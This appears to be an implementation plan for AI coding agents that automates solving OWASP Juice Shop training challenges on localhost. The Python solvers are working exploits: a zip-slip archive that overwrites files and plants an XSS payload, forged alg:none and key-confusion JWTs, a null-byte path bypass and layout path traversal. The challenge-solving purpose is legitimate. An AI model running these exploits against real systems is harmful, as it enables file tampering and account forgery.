# Juice Shop Automator — Phase 3 (Improper Input Validation + Vulnerable Components + videoXssChallenge) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend the existing Juice Shop automator (framework + 55 challenges already
merged from Phases 1–2) to solve Improper Input Validation (11 of 12 —
`nftMintChallenge` deferred, see below), Vulnerable Components (8 of 8), and the
`videoXssChallenge` deferred from Phase 1's XSS category (1) — 20 of the 21
challenges originally planned for Phase 3.

**Architecture:** Same as Phases 1–2 — new solver modules registered via
`solvers.base.register`, consuming `core.client.JuiceShopClient` /
`solvers.base.SolverContext`, executed by the existing `core.runner.run_all` and
verified against the live `/api/Challenges/` endpoint. One small, deliberate
framework change: `setup.py`'s `start_server()` needs to pass an environment
variable that disables Juice Shop's environment-based challenge auto-disabling
(explained under `jwtForgedChallenge` below) — everything else is new solver files.

**Tech Stack:** Python 3.11+, `requests` (existing), `pyjwt>=2.8` (new — forging
JWTs for `jwtUnsignedChallenge`/`jwtForgedChallenge`). No new dependency needed for
the ZIP-based file-write exploit — Python's standard-library `zipfile` module is
sufficient.

## Global Constraints

- Target instance: `http://localhost:3000`, started via `npm start`, never Docker
  (same as Phases 1–2).
- No mocking. A solver is only considered done when `runner.py` observes
  `solved: true` for its key from the live `/api/Challenges/` endpoint.
- Every solver is isolated: an exception in one must not stop the others (already
  guaranteed by `core.runner.run_all`).
- Email domain for all seeded accounts is `juice-sh.op`.
- **Known deviation from the original design spec:** `nftMintChallenge`
  ("Mint the Honey Pot") requires a real on-chain Ethereum Sepolia-testnet
  transaction, detected server-side via a WebSocket listener connected to
  `wss://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_API_KEY}` (`routes/nftMint.ts`).
  The server logs "will not work as intended without a valid ALCHEMY_API_KEY" at
  startup for this exact challenge, and there is no local/offline path to satisfy
  it — it needs a real funded testnet wallet and a paid/free Alchemy API key this
  environment doesn't have. It's deferred, same treatment as the LLM-dependent
  challenges excluded in Phases 1–2. Phase 3 therefore delivers 20, not 21;
  overall target becomes 129, not 130 (109 after Phase 2, +20 here).
- **Environment quirk fixed in this phase:** `jwtForgedChallenge` declares
  `disabledEnv: [Windows]` in `data/static/challenges.yml`, and
  `config/default.yml`'s `challenges.safetyMode` defaults to `auto` — which, per
  `lib/utils.ts`'s `getChallengeEnablementStatus`, disables any challenge whose
  `disabledEnv` includes the host OS unless `safetyMode` is explicitly
  `'disabled'`. Since this project always runs on Windows (per `npm start`, never
  Docker), that challenge is unreachable unless the server is started with
  `challenges.safetyMode` forced to `disabled`. Fixed via the `NODE_CONFIG`
  environment variable Node's `config` package reads automatically — no source
  file changes to the `juice-shop/` checkout itself.
- Verified directly against the Juice Shop 2026 `master` source
  (`routes/verify.ts`, `routes/order.ts`, `routes/deluxe.ts`, `routes/fileUpload.ts`,
  `routes/fileServer.ts`, `routes/nftMint.ts`, `routes/videoHandler.ts`,
  `routes/dataErasure.ts`, `lib/insecurity.ts`, `lib/utils.ts`, `models/feedback.ts`,
  `models/challenge.ts`, `server.ts`, `views/dataErasureResult.hbs`,
  `config/default.yml`) fetched on 2026-08-09 — endpoints, field names, and
  config-driven values (campaign dates, roles, allowed file types) are taken
  directly from that source, not guessed.

---

### Task 1: Improper Input Validation solvers (11 of 12 — nftMintChallenge deferred)

**Files:**
- Create: `solvers/improper_input_validation.py`
- Test: `tests/test_improper_input_validation_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 11 registered solvers under category `"Improper Input Validation"`.

- [ ] **Step 1: Write `solvers/improper_input_validation.py`**

```python
"""Improper Input Validation category solvers (11 of 12 — nftMintChallenge
needs a real funded Sepolia-testnet wallet + Alchemy API key, neither of which
this environment has, and is deferred). Verified against routes/verify.ts,
routes/order.ts, routes/deluxe.ts, routes/fileUpload.ts, routes/fileServer.ts,
lib/insecurity.ts, and models/feedback.ts (fetched 2026-08-09)."""
import base64
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts registerAdminChallenge/passwordRepeatChallenge/
# emptyUserRegistration: all three are Express middleware mounted on
# POST /api/Users, BEFORE finale-rest's actual user-creation handler. They
# fire purely on request-body content, regardless of whether the
# registration itself ultimately succeeds server-side. ---

@register("registerAdminChallenge", "Improper Input Validation", 3)
def solve_register_admin(ctx: SolverContext) -> None:
    email = f"regadmin.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.post(
        "/api/Users",
        json={"email": email, "password": "Test1234!", "passwordRepeat": "Test1234!", "role": "admin"},
    )


@register("passwordRepeatChallenge", "Improper Input Validation", 1)
def solve_password_repeat(ctx: SolverContext) -> None:
    email = f"pwrepeat.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.post(
        "/api/Users",
        json={"email": email, "password": "Test1234!", "passwordRepeat": "Different1234!"},
    )


@register("emptyUserRegistration", "Improper Input Validation", 2)
def solve_empty_user_registration(ctx: SolverContext) -> None:
    ctx.client.post("/api/Users", json={"email": "", "password": "", "passwordRepeat": ""})


# --- routes/order.ts calculateApplicableDiscount: config-driven campaign
# coupon codes (routes/order.ts's `campaigns` const) all have validOn dates
# in 2019-2023 — every one is already "expired" relative to real time, so
# submitting any of them via base64("<code>-<validOnEpochMs>") at checkout
# satisfies `campaign.validOn < Date.now()` without needing to touch the
# clock at all. WMNSDY2019's validOn is 1551999600000 (Mar 8 2019 00:00
# GMT+1, computed once via `node -e "console.log(new Date('Mar 08, 2019
# 00:00:00 GMT+0100').getTime())"`). ---

@register("manipulateClockChallenge", "Improper Input Validation", 4)
def solve_manipulate_clock(ctx: SolverContext) -> None:
    email = f"clock.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": 1}).raise_for_status()
    coupon_data = base64.b64encode(b"WMNSDY2019-1551999600000").decode()
    ctx.client.post(f"/rest/basket/{bid}/checkout", json={"couponData": coupon_data}).raise_for_status()


# --- routes/order.ts: `challengeUtils.solveIf(negativeOrderChallenge, () =>
# totalPrice < 0)`. Adding a basket item with a large negative quantity
# (quantityCheck's stock/limit comparisons are trivially satisfied for
# negative numbers, so nothing blocks it) makes that item's itemTotal
# negative, and checkout computes totalPrice as the sum of item totals. ---

@register("negativeOrderChallenge", "Improper Input Validation", 3)
def solve_negative_order(ctx: SolverContext) -> None:
    email = f"negorder.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": -1000}).raise_for_status()
    ctx.client.post(f"/rest/basket/{bid}/checkout").raise_for_status()


# --- routes/deluxe.ts upgradeToDeluxe: the free-upgrade branch is reached
# whenever `paymentMode` is anything other than the literal strings
# "wallet" or "card" — the two payment-verification blocks are skipped
# entirely, and the user is upgraded regardless. security.appendUserId()
# (mounted on this route) sets req.body.UserId from the auth token itself,
# so it doesn't need to be sent explicitly. ---

@register("freeDeluxeChallenge", "Improper Input Validation", 3)
def solve_free_deluxe(ctx: SolverContext) -> None:
    email = f"freedeluxe.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/rest/deluxe-membership", json={"paymentMode": "free"}).raise_for_status()


# --- routes/fileUpload.ts checkUploadSize/checkFileType: both are
# unconditional middleware on POST /file-upload (field name "file"),
# firing on every upload regardless of what later middleware does with the
# file. uploadSizeChallenge needs file.size > 100000 bytes (but under
# multer's own 200000-byte limit, or the upload itself gets rejected).
# uploadTypeChallenge needs an extension NOT in the server's allowed set
# (pdf/xml/zip/yml/yaml) — reusing the same oversized payload with a ".txt"
# name solves both challenges in one request. ---

@register("uploadSizeChallenge", "Improper Input Validation", 3)
def solve_upload_size(ctx: SolverContext) -> None:
    email = f"uploadsize.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    payload = b"A" * 150000
    ctx.client.post("/file-upload", files={"file": ("big.pdf", payload, "application/pdf")}).raise_for_status()


@register("uploadTypeChallenge", "Improper Input Validation", 3)
def solve_upload_type(ctx: SolverContext) -> None:
    email = f"uploadtype.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("payload.txt", b"not an allowed type", "text/plain")}).raise_for_status()


# --- models/feedback.ts rating setter: fires whenever a Feedback's rating
# is literally 0, bypassing the frontend's 1-5 star widget. Needs a fresh
# captcha, same as every /api/Feedbacks POST. ---

@register("zeroStarsChallenge", "Improper Input Validation", 1)
def solve_zero_stars(ctx: SolverContext) -> None:
    captcha = ctx.client.get("/rest/captcha").json()
    ctx.client.post(
        "/api/Feedbacks",
        json={"comment": "zero stars", "rating": 0, "captchaId": captcha["captchaId"], "captcha": captcha["answer"]},
    ).raise_for_status()


# --- routes/verify.ts accessControlChallenges: solved by requesting a
# specific, exact, already-percent-encoded product image filename whose
# raw bytes are not valid UTF-8/URL-safe when decoded — the check compares
# the *lowercased raw URL* against this literal encoded string, so no
# decoding on our end is needed, just requesting this exact path. ---

@register("missingEncodingChallenge", "Improper Input Validation", 1)
def solve_missing_encoding(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/products/%e1%93%9a%e1%98%8f%e1%97%a2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg").raise_for_status()


# --- routes/fileServer.ts verifySuccessfulPoisonNullByteExploit: solved
# either as a side effect of any of easterEggLevelOneChallenge/
# forgottenDevBackupChallenge/forgottenBackupChallenge/
# misplacedSignatureFileChallenge already being solved (all from Phase 2,
# or not run in this test's isolation), OR standalone by requesting the
# literal seeded file "encrypt.pyc" through the same poison-null-byte
# bypass — solved independently of any other challenge's state. ---

@register("nullByteChallenge", "Improper Input Validation", 4)
def solve_null_byte(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/encrypt.pyc%2500.md").raise_for_status()
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_improper_input_validation_live.py
"""No mocking, per project convention: runs the real solvers against a live
Juice Shop instance and checks the live score-board."""
import pytest

import solvers.improper_input_validation  # noqa: F401 - registers the solvers
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

IMPROPER_INPUT_VALIDATION_KEYS = [
    "registerAdminChallenge", "passwordRepeatChallenge", "emptyUserRegistration",
    "manipulateClockChallenge", "negativeOrderChallenge", "freeDeluxeChallenge",
    "uploadSizeChallenge", "uploadTypeChallenge", "zeroStarsChallenge",
    "missingEncodingChallenge", "nullByteChallenge",
]


def test_all_improper_input_validation_challenges_solved():
    results = run_all(categories=["Improper Input Validation"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in IMPROPER_INPUT_VALIDATION_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test against the running instance**

```bash
pytest tests/test_improper_input_validation_live.py -v
```

Expected: PASS. If `nullByteChallenge` fails when run in this file's isolation
(no Phase 2 solvers ran first in this server session), that's fine as long as
the standalone `encrypt.pyc` trigger fires — if it still fails, double-check the
literal 3-character substring `%00` (not a real NUL byte) is present in the
*decoded* `req.params.file` Express sees; the URL must contain `%2500` so Express
decodes it once into the literal text `%00` before `cutOffPoisonNullByte` runs.

- [ ] **Step 4: Commit**

```bash
git add solvers/improper_input_validation.py tests/test_improper_input_validation_live.py
git commit -m "feat: solve 11 of 12 Improper Input Validation challenges (nftMintChallenge deferred)"
```

---

### Task 2: Vulnerable Components solvers (8) + videoXssChallenge (1)

**Files:**
- Create: `solvers/vulnerable_components.py`
- Test: `tests/test_vulnerable_components_live.py`
- Modify: `requirements.txt` (add `pyjwt>=2.8`)
- Modify: `setup.py` (pass `NODE_CONFIG` env var enabling `jwtForgedChallenge` on Windows)

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 8 registered solvers under category `"Vulnerable Components"`, plus 1
  under category `"XSS"` (`videoXssChallenge`, deferred from Phase 1 — it belongs
  to the XSS category in Juice Shop's own taxonomy even though it's implemented
  here alongside `fileWriteChallenge`, since both exploit the same ZIP-slip
  arbitrary-file-write bug and are naturally solved by the same upload).

- [ ] **Step 1: Enable `jwtForgedChallenge` — modify `setup.py`'s `start_server()`**

Find the existing `start_server` function in `setup.py` (from Phase 1):

```python
def start_server(target_dir: str) -> subprocess.Popen:
    return subprocess.Popen(["npm", "start"], cwd=target_dir)
```

Replace it with a version that forces `challenges.safetyMode` to `disabled` via
the `NODE_CONFIG` environment variable Node's `config` package reads
automatically — this makes `jwtForgedChallenge` (and any other
Windows/Docker/Heroku-disabled-by-default challenge legitimately solvable on
this platform) reachable, without editing anything inside the `juice-shop/`
checkout itself:

```python
def start_server(target_dir: str) -> subprocess.Popen:
    env = os.environ.copy()
    env["NODE_CONFIG"] = '{"challenges":{"safetyMode":"disabled"}}'
    return subprocess.Popen(["npm", "start"], cwd=target_dir, env=env)
```

(`os` is already imported at the top of `setup.py` from Phase 1 — no new import
needed.)

**If the Juice Shop instance you're testing against was already started manually
(not through `setup.py`) without this environment variable**, restart it with
`NODE_CONFIG='{"challenges":{"safetyMode":"disabled"}}' npm start` (bash) before
running this task's live test, or `jwtForgedChallenge` will fail with no code-level
bug to fix.

- [ ] **Step 2: Add the new dependency**

```
# requirements.txt — append this line
pyjwt>=2.8
```

- [ ] **Step 3: Write `solvers/vulnerable_components.py`**

```python
"""Vulnerable Components category solvers (8 of 8) plus videoXssChallenge (XSS
category, deferred from Phase 1 — needs this file's arbitrary-file-write
exploit). Verified against routes/fileUpload.ts, routes/verify.ts,
routes/videoHandler.ts, lib/insecurity.ts (fetched 2026-08-09)."""
import base64
import io
import json
import uuid
import zipfile

import jwt as pyjwt

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/fileUpload.ts extractZipBuffer: for every entry in an
# uploaded .zip, the server computes `path.resolve('uploads/complaints/' +
# entry.path)` and writes to it as long as that resolved path still falls
# under the project root (`path.resolve('.')`) — a classic zip-slip. Two
# ".." segments from "uploads/complaints/" reach the project root, so
# "../../ftp/legal.md" overwrites the real legal.md (the one specific
# target fileWriteChallenge's own check looks for) and
# "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt"
# overwrites the promo video's subtitle track — which routes/videoHandler.ts
# serves back verbatim, so planting the XSS payload there solves
# videoXssChallenge (XSS category) the moment anyone requests the promo
# video page. Both entries are delivered in one upload. ---

def _build_exploit_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../ftp/legal.md", "pwned by fileWriteChallenge\n")
        zf.writestr(
            "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt",
            "WEBVTT\n\n1\n00:00:00.000 --> 00:00:05.000\n</script><script>alert(`xss`)</script>\n",
        )
    return buf.getvalue()


@register("fileWriteChallenge", "Vulnerable Components", 6)
def solve_file_write(ctx: SolverContext) -> None:
    email = f"filewrite.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/file-upload",
        files={"file": ("exploit.zip", _build_exploit_zip(), "application/zip")},
    ).raise_for_status()


@register("videoXssChallenge", "XSS", 6)
def solve_video_xss(ctx: SolverContext) -> None:
    email = f"videoxss.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/file-upload",
        files={"file": ("exploit.zip", _build_exploit_zip(), "application/zip")},
    ).raise_for_status()
    ctx.client.get("/promotion").raise_for_status()  # routes/videoHandler.ts's promotionVideo() re-reads the subtitle file and re-checks on every request


# --- routes/verify.ts jwtChallenges (mounted globally via app.use, so any
# request carrying the forged Authorization header triggers it):
# jwtUnsignedChallenge needs a token with header {"alg":"none"} and
# data.email containing "jwtn3d@" — built by hand (no library needed) since
# an unsigned token is just base64url(header) + "." + base64url(payload) +
# "." with an empty signature segment. jwt.verify() must not reject an
# alg:none token outright for this to work; if it does (a stricter
# jsonwebtoken build than the classic Juice Shop behavior this challenge
# assumes), that's a live finding to investigate, not a payload bug. ---

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


@register("jwtUnsignedChallenge", "Vulnerable Components", 5)
def solve_jwt_unsigned(ctx: SolverContext) -> None:
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"data": {"email": f"jwtn3d@{DOMAIN}", "id": 1, "role": "customer"}}).encode())
    token = f"{header}.{payload}."
    ctx.client.get("/rest/user/whoami", headers={"Authorization": f"Bearer {token}"})


# --- routes/verify.ts jwtChallenges: jwtForgedChallenge needs a token
# whose header algorithm is "HS256" and whose data.email contains
# "rsa_lord@", verified successfully by `jwt.verify(token,
# security.publicKey, callback)` — a classic RS256-to-HS256 key-confusion
# attack. security.publicKey is the RSA public key served (deliberately)
# at GET /encryptionkeys/jwt.pub; since jwt.verify() is called with no
# `algorithms` allowlist, an attacker who knows the public key can sign a
# token with algorithm HS256 *using the public key's raw text as the HMAC
# secret*, and jwt.verify() will treat it as valid. Requires
# challenges.safetyMode=disabled (Step 1) since jwtForgedChallenge is
# Windows-disabled otherwise. ---

@register("jwtForgedChallenge", "Vulnerable Components", 6)
def solve_jwt_forged(ctx: SolverContext) -> None:
    pubkey_resp = ctx.client.get("/encryptionkeys/jwt.pub")
    pubkey_resp.raise_for_status()
    public_key_pem = pubkey_resp.text
    token = pyjwt.encode({"data": {"email": f"rsa_lord@{DOMAIN}", "id": 1, "role": "admin"}}, public_key_pem, algorithm="HS256")
    ctx.client.get("/rest/user/whoami", headers={"Authorization": f"Bearer {token}"})


# --- routes/verify.ts databaseRelatedChallenges (mounted with app.use(),
# runs on every request): typosquattingAngularChallenge/
# typosquattingNpmChallenge/supplyChainAttackChallenge/
# knownVulnerableComponentChallenge all solve when a single Feedback or
# Complaint message contains the right hardcoded substring(s) — same
# pattern as Phase 2's dlpPastebinDataLeakChallenge/leakedApiKeyChallenge.
# knownVulnerableComponentChallenge needs BOTH members of one of its two
# pairs in the SAME message (Op.and), so both go in one complaint. ---

@register("typosquattingNpmChallenge", "Vulnerable Components", 4)
def solve_typosquatting_npm(ctx: SolverContext) -> None:
    email = f"typonpm.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "We should never have depended on epilogue-js, it was a typosquat!"}).raise_for_status()


@register("typosquattingAngularChallenge", "Vulnerable Components", 5)
def solve_typosquatting_angular(ctx: SolverContext) -> None:
    email = f"typoang.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "ngy-cookie was a typosquat of ngx-cookie, be careful!"}).raise_for_status()


@register("supplyChainAttackChallenge", "Vulnerable Components", 5)
def solve_supply_chain_attack(ctx: SolverContext) -> None:
    email = f"supplychain.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "See https://github.com/eslint/eslint-scope/issues/39 for the eslint-scope supply chain attack."}).raise_for_status()


@register("knownVulnerableComponentChallenge", "Vulnerable Components", 4)
def solve_known_vulnerable_component(ctx: SolverContext) -> None:
    email = f"vulncomp.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": "sanitize-html 1.4.2 has a known bypass, please upgrade."},
    ).raise_for_status()


# --- routes/dataErasure.ts POST /dataerasure: `req.body.layout` is spread
# directly into the Handlebars render options as the `layout` setting
# (`res.render('dataErasureResult', {...req.body, ...themeVars})`), as long
# as its resolved lowercase path doesn't contain "ftp", "ctf.key", or
# "encryptionkeys". The `hbs` view engine resolves a relative `layout`
# path against the views directory, so "../package.json" escapes to the
# project root's package.json — plain JSON/text with no unmatched `{{`
# sequences, so hbs renders it as literal passthrough content instead of
# throwing a compile error. This is a live-verify-first path: if
# "../package.json" doesn't work exactly as reasoned (e.g. the `hbs`
# version resolves relative layout paths differently), read
# `views/dataErasureResult.hbs` and `node_modules/hbs`'s render logic in
# the actual checkout and retarget at a different existing, syntactically
# hbs-safe file — the *file content* doesn't matter to the challenge, only
# that the render completes successfully with our path. ---

@register("lfrChallenge", "Vulnerable Components", 5)
def solve_lfr(ctx: SolverContext) -> None:
    email = f"lfr.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/dataerasure", data={"layout": "../package.json"}).raise_for_status()
```

- [ ] **Step 4: Write the live verification test**

```python
# tests/test_vulnerable_components_live.py
"""No mocking, per project convention: runs the real solvers against a live
Juice Shop instance (started with challenges.safetyMode=disabled, see Step 1
above) and checks the live score-board."""
import pytest

import solvers.vulnerable_components  # noqa: F401 - registers the solvers
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

VULNERABLE_COMPONENTS_KEYS = [
    "fileWriteChallenge", "jwtUnsignedChallenge", "jwtForgedChallenge",
    "typosquattingNpmChallenge", "typosquattingAngularChallenge",
    "supplyChainAttackChallenge", "knownVulnerableComponentChallenge", "lfrChallenge",
]


def test_all_vulnerable_components_challenges_solved():
    results = run_all(categories=["Vulnerable Components"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in VULNERABLE_COMPONENTS_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"


def test_video_xss_challenge_solved():
    results = run_all(categories=["XSS"])
    by_key = {r["key"]: r for r in results}
    assert by_key.get("videoXssChallenge", {}).get("solved"), by_key.get("videoXssChallenge")
```

- [ ] **Step 5: Run the live tests against the running instance**

```bash
pip install -r requirements.txt
pytest tests/test_vulnerable_components_live.py -v
```

Expected: PASS. If `jwtForgedChallenge` fails specifically with the challenge
staying unsolved (not an HTTP error), confirm the running instance actually has
`NODE_CONFIG` set (check the server's startup log doesn't show it being
Windows-disabled, or just restart it per Step 1's fallback command) before
touching any payload code. If `lfrChallenge` fails, this is the one solver most
likely to need live-adjustment per its own comment — try alternate `layout`
values (e.g. `../../package.json`, or an existing `.hbs`/`.pug` view file under
`views/` that isn't itself forbidden) and inspect the actual HTTP response body
for the render error before guessing further. If `videoXssChallenge` fails after
`fileWriteChallenge` passes, the ZIP most likely wrote successfully but the
subtitle path was wrong — check `config/default.yml`'s
`application.promotion.subtitles` key for the actual configured filename (default
assumed here is `owasp_promo.vtt`) and re-derive the target path from
`routes/videoHandler.ts`'s `getSubsFromFile()`.

- [ ] **Step 6: Commit**

```bash
git add solvers/vulnerable_components.py tests/test_vulnerable_components_live.py requirements.txt setup.py
git commit -m "feat: solve 8 of 8 Vulnerable Components challenges + videoXssChallenge (nftMintChallenge deferred elsewhere)"
```

---

### Task 3: Full Phase 3 report run

**Files:**
- No new files — this task runs the assembled CLI end-to-end, and updates
  `main.py`'s solver-import list.

**Interfaces:**
- Consumes everything from Tasks 1–2, plus Phases 1–2's already-registered
  categories.

- [ ] **Step 1: Register the two new solver modules in `main.py`**

In `main.py`, alongside the existing `try: import solvers.X` blocks, add:

```python
try:
    import solvers.improper_input_validation  # noqa: F401
except ImportError:
    pass
try:
    import solvers.vulnerable_components  # noqa: F401
except ImportError:
    pass
```

- [ ] **Step 2: Run the full Phase 1 + 2 + 3 slice against a fresh instance**

Start (or restart) the Juice Shop instance with `challenges.safetyMode` disabled
(Task 2, Step 1's fix means this now happens automatically if launched via
`python main.py --setup`; if the instance is already running from a manual
`npm start`, restart it with
`NODE_CONFIG='{"challenges":{"safetyMode":"disabled"}}' npm start` first), then:

```bash
python main.py --category Injection --category XSS --category "Broken Authentication" --category "Sensitive Data Exposure" --category "Broken Access Control" --category "Improper Input Validation" --category "Vulnerable Components"
```

Expected output: a report table with `TOTAL: 75/75 solved` (55 from Phases 1–2 +
20 from Phase 3). If any key is not solved, its `[FAIL]` line includes the
captured HTTP error — fix that specific solver function only, then rerun just
that category with `--category <name>`.

- [ ] **Step 3: Commit**

```bash
git add main.py
git commit -m "chore: Phase 3 (Improper Input Validation + Vulnerable Components + videoXssChallenge) complete — 20/21 (75/129 overall)"
```
